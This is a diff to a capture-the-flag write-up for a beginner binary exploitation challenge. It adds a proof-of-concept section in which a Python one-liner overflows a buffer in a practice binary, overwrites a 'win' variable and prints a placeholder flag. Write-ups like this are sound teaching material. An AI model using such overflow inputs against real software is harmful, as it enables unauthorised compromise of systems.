@@ -53,9 +53,17 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-### Solution
+### Proof of Concept
 
 We can overwrite the `win` variable by inputting a series of characters that exceed the size of the buffer.
+
+```
+┌──(kali💀JesusCries)-[~/Desktop]
+└─$ python -c "print('A' * 32 + 'B')" | ./binexp-0
+BAT22{f4k3_fl4g_f0r_t3st1ng}     
+```
+
+### Solution
 
 Using pwntools to automate the process:
 
